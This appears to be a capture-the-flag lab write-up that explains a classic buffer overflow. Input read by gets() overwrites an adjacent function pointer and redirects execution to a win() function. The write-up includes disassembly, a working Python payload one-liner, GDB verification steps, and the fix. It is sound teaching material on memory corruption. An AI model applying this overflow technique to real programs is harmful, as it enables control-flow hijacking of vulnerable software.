# ex03 — Return Address Overwrite (Function Pointer)

## Goal

Overwrite a function pointer `fp` to redirect execution to the `win()` function:

```
code flow successfully changed
```

## Concept

This challenge demonstrates **control flow hijacking** through a function pointer. The program:

1. Allocates a 64-byte buffer and a function pointer `fp` (initialized to `NULL`).
2. Reads input into the buffer using `gets()`.
3. If `fp` is non-zero, calls it as a function.

By overflowing the buffer, we overwrite `fp` with the address of a `win()` function, causing the program to execute our target code.

### Function pointers in C

A function pointer stores the address of a function. When called, execution jumps to that address. If we can control the value of a function pointer, we can redirect program execution to any code we want.

## Memory Layout

```
Higher addresses
┌─────────────────────────────┐
│  fp (4 bytes)               │  [esp+0x5c]  ← function pointer, initially NULL
├─────────────────────────────┤
│  ... (padding)              │
├─────────────────────────────┤
│  buffer (64 bytes)          │  [esp+0x1c]  ← gets() writes here
├─────────────────────────────┤
│  ...                        │
Lower addresses
```

## Relevant Assembly (`main`)

```asm
08048438 <main>:
    push   ebp
    mov    ebp, esp
    and    esp, 0xfffffff0
    sub    esp, 0x60

    mov    DWORD PTR [esp+0x5c], 0x0   ; fp = NULL

    lea    eax, [esp+0x1c]              ; eax = &buffer[0]
    mov    DWORD PTR [esp], eax         ; arg1 = buffer
    call   gets                         ; gets(buffer) — NO BOUNDS CHECK

    cmp    DWORD PTR [esp+0x5c], 0x0    ; if (fp == NULL)
    je     0x08048477                   ;   skip the call

    mov    eax, 0x8048560               ; "calling function pointer, jumping to 0x%08x"
    mov    edx, DWORD PTR [esp+0x5c]    ; edx = fp
    mov    DWORD PTR [esp+0x4], edx     ; arg2 = fp
    mov    DWORD PTR [esp], eax         ; arg1 = format string
    call   printf                       ; printf("calling function pointer...", fp)

    mov    eax, DWORD PTR [esp+0x5c]    ; eax = fp
    call   eax                          ; call fp() — REDIRECTED EXECUTION!

    leave
    ret
```

### The `win()` function

```asm
08048424 <win>:
    push   ebp
    mov    ebp, esp
    sub    esp, 0x18

    mov    DWORD PTR [esp], 0x8048540   ; "code flow successfully changed"
    call   puts

    leave
    ret
```

### Step-by-step analysis

| Instruction | What it does |
|---|---|
| `mov [esp+0x5c], 0x0` | Sets `fp = NULL` |
| `call gets` | Reads unlimited input into buffer |
| `cmp [esp+0x5c], 0x0` | Checks if `fp` is still NULL |
| `call eax` | Calls the function pointed to by `fp` |

## Exploit

Overwrite `fp` with the address of `win()` (`0x08048424`):

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x24\x84\x04\x08")' | ./bin
```

### Why it works

- 64 bytes of `"A"` fill the buffer at `[esp+0x1c]` through `[esp+0x5b]`
- The next 4 bytes (`\x24\x84\x04\x08`) overwrite `fp` at `[esp+0x5c]`
- In little-endian, this is the address `0x08048424`
- Since `fp` is now non-NULL, the program calls it
- Execution jumps to `win()`, which prints the success message

### Little-endian explanation

```
Memory address:  [esp+0x5c]  [esp+0x5d]  [esp+0x5e]  [esp+0x5f]
Byte value:       0x24        0x84        0x04        0x08

As a 32-bit address (little-endian): 0x08048424
```

## GDB Verification

```bash
gdb -q ./bin
```

```gdb
# Break after gets() returns
break *0x08048455
run < <(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x24\x84\x04\x08")')

# Check the function pointer
x/wx $esp+0x5c
# Output: 0x08048424

# Verify it points to win()
info symbol 0x08048424
# Output: win

# Disassemble at the pointer
x/4i 0x08048424
# Output: push ebp / mov ebp,esp / sub esp,0x18 / ...

# Continue to see success
continue
```

## Key Takeaway

Function pointers are powerful but dangerous. If an attacker can control a function pointer's value, they can redirect execution to any code. This is the foundation of more advanced exploits like **return-oriented programming (ROP)**. The fix is to never store function pointers near unsafe buffers, or to use bounds-checked input functions.
